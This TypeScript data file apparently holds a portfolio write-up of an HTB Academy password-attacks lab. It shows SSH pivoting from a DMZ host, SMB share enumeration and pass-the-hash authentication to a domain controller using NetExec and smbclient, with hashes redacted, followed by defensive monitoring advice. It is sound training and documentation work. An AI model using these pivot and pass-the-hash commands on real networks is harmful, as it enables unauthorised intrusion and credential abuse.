// Generated from canonical report.md; do not edit directly.
export const nexuraWriteup = {
  "slug": "htb-password-attacks-skills-assessment-nexura",
  "platform": "HTB Academy",
  "category": "Authentication / Password Attacks",
  "title": "Password Attacks — NEXURA Skills Assessment",
  "status": "DOCUMENTED PRACTICE — EVIDENCE PENDING",
  "kind": "lab",
  "date": "2026-11-03",
  "source": "https://academy.hackthebox.com/course/preview/password-attacks",
  "summary": "Verified DMZ-to-DC01 SSH pivot, SMB enumeration, and privileged NTLM authentication. NTDS extraction remains unverified locally.",
  "tags": [
    "HTB Academy",
    "Active Directory",
    "NTLM",
    "SSH Pivoting",
    "SMB",
    "DFIR"
  ],
  "sections": [
    {
      "heading": "1. Overview",
      "text": "This case study documents a NEXURA Active Directory skills assessment conducted within an authorized Hack The Box Academy environment.\n\nThe immediate assessment objective was to recover the NTLM hash of the NEXURA domain Administrator.\n\nThe learner's recorded activity did not successfully complete NTDS extraction. However, it demonstrated several important practical outcomes: SSH access to the DMZ host, internal network discovery, validation of domain-controller reachability, SOCKS pivot troubleshooting, SSH local port forwarding, SMB share enumeration, and successful authentication to DC01 with privileged NTLM material.\n\nThe Administrator hash was independently confirmed in a public community write-up. This external reference result is explicitly separated from the learner's actual terminal evidence.\n\nThe assessment therefore remains classified as documented practice with pending evidence rather than a fully verified domain-compromise exercise."
    },
    {
      "heading": "2. Learning Objectives",
      "text": "",
      "points": [
        "Understand the relationship between a DMZ entry point and an internal Active Directory environment.",
        "Identify internal interfaces, routing information, and domain-controller DNS records.",
        "Configure SSH dynamic forwarding and SOCKS-based pivoting.",
        "Understand the differences between TCP connectivity, SMB negotiation, and successful authentication.",
        "Troubleshoot ProxyChains and SMB client timeouts.",
        "Configure SSH local port forwarding to reach an internal SMB service.",
        "Validate NTLM authentication using Samba SMBClient and NetExec.",
        "Distinguish privileged authentication from successful credential replication or NTDS extraction.",
        "Preserve the distinction between original evidence and third-party write-up references."
      ]
    },
    {
      "heading": "3. Technical Background",
      "text": "### Active Directory and SMB\n\nActive Directory provides centralized authentication and authorization across Windows domain environments.\n\nThe Server Message Block protocol is commonly used for file sharing, administrative shares, and domain resources.\n\nSMB generally operates over TCP port 445.\n\nAn open TCP port does not establish that SMB negotiation or authentication has succeeded. A complete test must progress through the protocol negotiation and authentication stages.\n\n### NTLM Pass-the-Hash\n\nNTLM authentication can permit the use of an account's NT hash without recovering the corresponding plaintext password.\n\nIn this assessment, NTLM material associated with the domain account `stom` was used to authenticate to the domain controller.\n\nNetExec's `(Pwn3d!)` indicator reported administrative access for the tested SMB host.\n\nThis is a meaningful finding, but it does not independently prove that domain credentials were extracted.\n\n### SSH Dynamic Forwarding\n\nSSH dynamic forwarding creates a SOCKS proxy on the attack machine.\n\nExample:\n\n\n\nCompatible TCP tools may be routed through this proxy using ProxyChains.\n\nThe forwarding session must remain active.\n\nIf the SSH process terminates, the SOCKS listener disappears and dependent connections will fail.\n\n### SSH Local Port Forwarding\n\nSSH local forwarding maps one local TCP endpoint to one destination through the SSH server.\n\nIn the recorded exercise, the mapping was:\n\n`Pwnbox:1445 → DMZ01 → DC01:445`\n\nThis provided a simpler way to test SMB than the earlier SOCKS-based approach.\n\n### NTDS and Domain Credential Extraction\n\nThe AD database contains highly sensitive credential material.\n\nDCSync attempts to obtain directory secrets through AD replication interfaces. Other NTDS extraction methods may rely on remote administration and volume-shadow-copy operations.\n\nSuccessful SMB authentication alone is not sufficient evidence that either method completed.",
      "code": "ssh -N -D 127.0.0.1:1080 jbetty@10.129.230.32"
    },
    {
      "heading": "4. Lab Environment",
      "text": "### Attack Host\n\n\n\n\n\n\n\n\n\n\n### DMZ01\n\n\n\n\n\n\n\n\n\n\n### Active Directory\n\n\n\n\n\n\n\n\nFull credentials and reusable NTLM hashes are intentionally redacted from the portfolio version.",
      "points": [
        "Platform: HTB Pwnbox",
        "Linux distribution: Parrot OS",
        "Observed IP address: `10.10.15.97`",
        "Shells encountered: PowerShell on Linux and Bash",
        "ProxyChains-ng: 4.17",
        "NetExec: 1.5.1",
        "Impacket: 0.12.0",
        "Other utilities: OpenSSH, netcat, Samba SMBClient, iproute2",
        "Hostname: DMZ01",
        "Assessment identifier: ACADEMY-PWATTCK-SADMZ01",
        "Operating system: Ubuntu 20.04.6 LTS",
        "External interface: `ens160`",
        "External address: `10.129.230.32/16`",
        "Internal interface: `ens192`",
        "Internal address: `172.16.119.13/24`",
        "SSH account: `jbetty`",
        "Domain: `NEXURA.HTB`",
        "Domain controller: DC01",
        "Domain-controller address: `172.16.119.11`",
        "SMB service: TCP/445",
        "RPC Endpoint Mapper: TCP/135",
        "Privileged account tested: `NEXURA\\stom`"
      ]
    },
    {
      "heading": "5. Reconnaissance and Initial Investigation",
      "text": "### 5.1 Initial SSH Access\n\nThe learner authenticated to the externally reachable DMZ01 host using the SSH account supplied for the exercise.\n\n\n\nThe successful connection displayed an Ubuntu 20.04.6 LTS login banner and provided an interactive shell.\n\nThis established an initial authenticated position on the DMZ host.\n\n### 5.2 Internal Interface Enumeration\n\nThe following commands were executed:\n\n\n\nObserved network interface information:\n\n\n\nObserved internal route:\n\n\n\nThese findings established that DMZ01 had direct connectivity to the internal network.\n\n### 5.3 Domain Controller Resolution\n\nThe learner queried the domain controller's name:\n\n\n\nObserved result:\n\n\n\nThe result verified the internal address of the domain controller.\n\n### 5.4 Direct SMB Reachability\n\nFrom DMZ01:\n\n\n\nObserved result:\n\n\n\nThis demonstrated TCP connectivity between the DMZ server and the domain controller.\n\nIt did not yet prove successful SMB authentication.\n\n**Evidence:** Original terminal text verified. A corresponding screenshot has not been recovered on Kali.\n\n**Evidence Status: PENDING**",
      "code": "ssh jbetty@10.129.230.32\n\nip -br addr\nip route\n\nlo      UNKNOWN  127.0.0.1/8\nens160  UP       10.129.230.32/16\nens192  UP       172.16.119.13/24\n\n172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13\n\ngetent hosts dc01.nexura.htb\n\n172.16.119.11 nexura.htb DC01 DC01.nexura.htb\n\nnc -vz -w 5 172.16.119.11 445\n\nConnection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!"
    },
    {
      "heading": "6. SOCKS Pivot Investigation",
      "text": "### 6.1 Creating the SOCKS Tunnel\n\nThe initial pivot used SSH dynamic forwarding:\n\n\n\nProxyChains was configured with:\n\n\n\nThis configuration routed compatible TCP client connections through DMZ01.\n\n### 6.2 Tunnel Termination\n\nAn SSH debug log showed successful authentication:\n\n\n\nHowever, the same session was later interrupted:\n\n\n\nAfter termination, the SOCKS listener was no longer available.\n\nThe learner confirmed this with:\n\n\n\nObserved failure:\n\n\n\nThis explained one category of ProxyChains failures.\n\n### 6.3 Restoring Forwarding\n\nAfter reopening the SSH tunnel, the learner observed a listening SSH process and a successful SOCKS port check.\n\nA later ProxyChains TCP test returned:\n\n\n\nAt this point, basic network connectivity was restored.\n\n**Evidence:** Authentic screenshot `image(20261102-155951).png` was supplied in the conversation.\n\nThe screenshot shows the SSH password prompt and Impacket SMB timeout.\n\nThe original screenshot is not currently present in the Kali website workspace.\n\n**Evidence Status: PENDING**",
      "code": "ssh -N -D 127.0.0.1:1080 \\\n  -o ExitOnForwardFailure=yes \\\n  jbetty@10.129.230.32\n\nstrict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n\nAuthenticated to 10.129.230.32 using \"password\".\nLocal forwarding listening on 127.0.0.1 port 1080.\n\n^C\nKilled by signal 2.\n\nss -lntp | grep ':1080'\nnc -vz -w 3 127.0.0.1 1080\n\nnc: connect to 127.0.0.1 port 1080 (tcp) failed: Connection refused\n\nStrict chain ... 127.0.0.1:1080 ... 172.16.119.11:445 ... OK\nConnection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!"
    },
    {
      "heading": "7. SMB Negotiation Troubleshooting",
      "text": "### 7.1 NetExec via ProxyChains\n\nThe learner tested SMB authentication using NetExec.\n\nRepresentative command with authentication material redacted:\n\n\n\nObserved output included:\n\n\n\nEarlier tests also reported SMBv1 connection timeouts.\n\nThe failures occurred before a successful SMB authentication response was produced.\n\n### 7.2 Impacket Troubleshooting\n\nThe learner attempted Impacket SMB operations through ProxyChains.\n\nAn observed failure was:\n\n\n\nThe timeout did not demonstrate invalid credentials.\n\nIt demonstrated that the attempted operation failed to establish or maintain the required communication.\n\n### 7.3 Important Interpretation\n\nThe investigation established a distinction between three conditions:\n\n1. A working SSH forwarding process.\n2. A successful TCP connection to a destination port.\n3. A successfully negotiated and authenticated SMB session.\n\nThese are separate outcomes.\n\nA successful netcat port check must not be reported as successful SMB authentication.\n\n**Evidence:** Authentic screenshot `image(20261102-160645).png` was supplied in the conversation.\n\nThe screenshot records a successful SOCKS TCP test and an unsuccessful Impacket operation.\n\nThe source screenshot has not been transferred into the Kali website workspace.\n\n**Evidence Status: PENDING**",
      "code": "proxychains4 -f \"$HOME/proxychains-nexura.conf\" \\\n  netexec smb 172.16.119.11 \\\n  -u stom \\\n  -H '<REDACTED_NT_HASH>' \\\n  -d NEXURA.HTB \\\n  --no-smbv1 \\\n  --smb-timeout 25 \\\n  --timeout 30 \\\n  -t 1 \\\n  --debug\n\nCreating SMBv3 connection to 172.16.119.11\nTimeout creating SMBv3 connection to 172.16.119.11\n\nRemoteOperations failed:\n[Errno Connection error (172.16.119.11:445)] timed out"
    },
    {
      "heading": "8. Successful SMB Access Through SSH Local Forwarding",
      "text": "### 8.1 Dedicated Port Forward\n\nThe learner configured a dedicated SSH local port forward:\n\n\n\nThis created the following communication path:\n\n\n\n### 8.2 Verifying the Forwarded Port\n\nThe learner ran:\n\n\n\nObserved result:\n\n\n\nThis verified that the forwarded TCP endpoint was accessible.\n\n### 8.3 Samba SMBClient Authentication\n\nThe learner tested SMB access through local port 1445:\n\n\n\nObserved share enumeration:\n\n\n\nThe client also reported:\n\n\n\nThis was not an authentication failure.\n\nThe listed shares demonstrate that the SMB client completed negotiation and authentication sufficiently to enumerate the available resources.\n\n### 8.4 Privileged Authentication With NetExec\n\nNext, the learner ran NetExec directly against the forwarded endpoint:\n\n\n\nObserved host information:\n\n\n\nObserved authentication result:\n\n\n\nThis was the strongest verified technical result in the exercise.\n\nThe result demonstrates successful NTLM authentication and NetExec's administrative-access indication on DC01.\n\nIt does not demonstrate that NTDS extraction was completed.\n\n**Evidence:** Authentic terminal output was supplied directly in the conversation.\n\nA screenshot showing the successful `(Pwn3d!)` result was not supplied.\n\n**Evidence Status: PENDING**",
      "code": "ssh -N \\\n  -L 127.0.0.1:1445:172.16.119.11:445 \\\n  -o ExitOnForwardFailure=yes \\\n  jbetty@10.129.230.32\n\nHTB Pwnbox\n    |\n    | 127.0.0.1:1445\n    v\nSSH Tunnel\n    |\n    v\nDMZ01 (10.129.230.32)\n    |\n    v\nDC01 (172.16.119.11:445)\n\nnc -vz -w 5 127.0.0.1 1445\n\nConnection to 127.0.0.1 1445 port [tcp/*] succeeded!\n\nsmbclient -L //127.0.0.1 \\\n  -p 1445 \\\n  -W NEXURA \\\n  -U 'stom%<REDACTED_NT_HASH>' \\\n  --pw-nt-hash \\\n  -m SMB3 \\\n  -t 20\n\nSharename   Type   Comment\n---------   ----   ------------------\nADMIN$      Disk   Remote Admin\nC$          Disk   Default share\nIPC$        IPC    Remote IPC\nNETLOGON    Disk   Logon server share\nSYSVOL      Disk   Logon server share\n\nSMB1 disabled -- no workgroup available\n\nnetexec smb 127.0.0.1 \\\n  --port 1445 \\\n  -u stom \\\n  -H '<REDACTED_NT_HASH>' \\\n  -d NEXURA.HTB \\\n  --no-smbv1 \\\n  --smb-timeout 20 \\\n  -t 1\n\nSMB 127.0.0.1 1445 DC01\nWindows 10 / Server 2019 Build 17763\nname: DC01\ndomain: nexura.htb\nsigning: True\n\n[+] NEXURA.HTB\\stom:<REDACTED> (Pwn3d!)"
    },
    {
      "heading": "9. Assessment Question: Domain Administrator NTLM",
      "text": "### Objective\n\nThe question required the NTLM hash belonging to:\n\n`NEXURA\\Administrator`\n\nThe learner attempted to recover this value using NTDS-related operations.\n\nAn Impacket approach using `-just-dc-user Administrator` did not succeed in the recorded session because of connection timeouts.\n\n### Independent Reference Verification\n\nA separate public write-up by `jameskaois` contains an NTDS extraction result for the domain Administrator account.\n\nThe referenced account has RID 500.\n\nThe full NTLM hash was checked against that write-up in this conversation.\n\nFor the public portfolio report, the reusable hash is represented in redacted form:\n\n\n\nThis is a source-supported reference result, not a locally observed extraction.\n\nIt is also distinct from the local Administrator hash associated with JUMP01.\n\n### Verification Boundary\n\nNo supplied terminal output shows a completed NTDS dump on the learner's current instance.\n\nNo screenshot establishes that the Administrator hash was extracted locally.\n\nNo accepted HTB answer submission was supplied.\n\nTherefore, completion of the NTDS extraction objective remains unverified.",
      "code": "Administrator:500:<LM_HASH>:36e09e1e...b8d6d23:::"
    },
    {
      "heading": "10. Results and Verification",
      "text": "### Verified Outcomes\n\n\n\n\n\n\n\n\n\n\n\n\n\n### Outcomes Not Verified Locally\n\n\n\n\n\n\n\n### Evidence Requirements\n\nThe original conversation includes two screenshots of networking and SMB troubleshooting.\n\nThey have not been copied into the Kali website evidence directory.\n\nThe successful administrative SMB authentication is supported by real terminal output, but no screenshot of that final result is available.\n\nThe report must retain the classification `EVIDENCE PENDING` until the evidence requirements are satisfied.",
      "points": [
        "SSH authentication to DMZ01 succeeded.",
        "DMZ01's internal interface was identified.",
        "Internal network routing was confirmed.",
        "DC01 resolved to `172.16.119.11`.",
        "DMZ01 reached DC01 on TCP/445.",
        "SOCKS forwarding behavior was investigated.",
        "The terminated SSH tunnel was identified as one cause of failure.",
        "SSH local port forwarding was established.",
        "The forwarded SMB service responded.",
        "Samba SMBClient enumerated DC01 shares.",
        "NetExec authenticated the privileged domain account and reported `(Pwn3d!)`.",
        "Successful extraction of the domain Administrator hash.",
        "Successful replication of AD credential material.",
        "Completed NTDS dumping.",
        "Full compromise of every host in the assessment.",
        "Official acceptance of the submitted answer."
      ]
    },
    {
      "heading": "11. Security Implications",
      "text": "### DMZ-to-Internal Access\n\nDMZ01 had a network interface directly connected to the internal domain subnet.\n\nAn authenticated operator on that host could reach the internal domain controller.\n\nThis illustrates why multihomed systems should be carefully assessed when defining trust boundaries.\n\n### Reusable Authentication Material\n\nThe successful use of an NT hash to authenticate demonstrates the security significance of exposed credential material.\n\nAn attacker does not always need a plaintext password to authenticate to an NTLM-enabled service.\n\n### Privileged Domain Access\n\nNetExec identified administrative access for the tested domain account.\n\nAccounts with extensive administrative privileges present a significant risk when their credentials are exposed.\n\n### Reporting Accuracy\n\nSuccessful authentication to a domain controller and successful extraction of directory secrets are distinct findings.\n\nA professional assessment must not report the latter solely because the former succeeded."
    },
    {
      "heading": "12. Defensive Perspective",
      "text": "### Network Segmentation\n\nRestrict unnecessary connections from DMZ hosts to domain controllers.\n\nApply host firewall rules and service-specific network access controls.\n\n### Privileged Account Protection\n\nLimit standing domain-administrator privileges.\n\nUse dedicated administrative accounts and enforce appropriate separation between user and privileged sessions.\n\nAvoid exposing highly privileged reusable authentication material on shared systems.\n\n### Monitoring Opportunities\n\nPotentially relevant Windows security events include:\n\n\n\n\n\nInvestigators should correlate host, account, source address, privileges, and activity timelines rather than interpreting a single event as proof of compromise.\n\n### Credential Access Detection\n\nMonitor unusual access to LSASS memory.\n\nInvestigate unexpected credential extraction utilities and privileged authentication patterns.\n\nMonitor directory replication operations and suspicious administrative activity against domain controllers.\n\n### SMB Security\n\nMaintain supported SMB versions and enforce suitable authentication and integrity protections.\n\nSMB signing protects message integrity but does not automatically prevent the use of valid stolen credentials.",
      "points": [
        "Event 4624: successful logon, including network logons.",
        "Event 4672: special privileges assigned to a new logon.",
        "Event 4662: directory-service object access, useful for investigating replication activity when appropriate auditing is configured."
      ]
    },
    {
      "heading": "13. Lessons Learned",
      "text": "The central troubleshooting lesson was that TCP reachability, protocol negotiation, and authentication must be tested separately.\n\nThe initial SOCKS failures included a terminated SSH session and later SMB-level timeouts.\n\nExamining the listening process confirmed whether forwarding was active.\n\nTesting the internal network from DMZ01 ruled out an incorrect domain-controller address.\n\nUsing SSH local port forwarding reduced the number of moving parts and enabled the learner to obtain a reliable SMB authentication result.\n\nThe reporting lesson was equally important: independent public references can corroborate a lab solution, but they must not replace authentic evidence of the learner's own actions."
    },
    {
      "heading": "14. References",
      "text": "",
      "points": [
        "HTB Academy — Password Attacks: https://academy.hackthebox.com/course/preview/password-attacks",
        "jameskaois — Skills Assessment, Password Attacks: https://github.com/jameskaois/ctf-writeups/blob/main/cpts/10-password-attacks/26-skills-assessment-password-attacks.md",
        "MITRE ATT&CK T1003.001 — LSASS Memory: https://attack.mitre.org/techniques/T1003/001/",
        "MITRE ATT&CK T1003.006 — DCSync: https://attack.mitre.org/techniques/T1003/006/",
        "MITRE ATT&CK T1552.001 — Credentials in Files: https://attack.mitre.org/techniques/T1552/001/"
      ]
    }
  ],
  "images": []
};
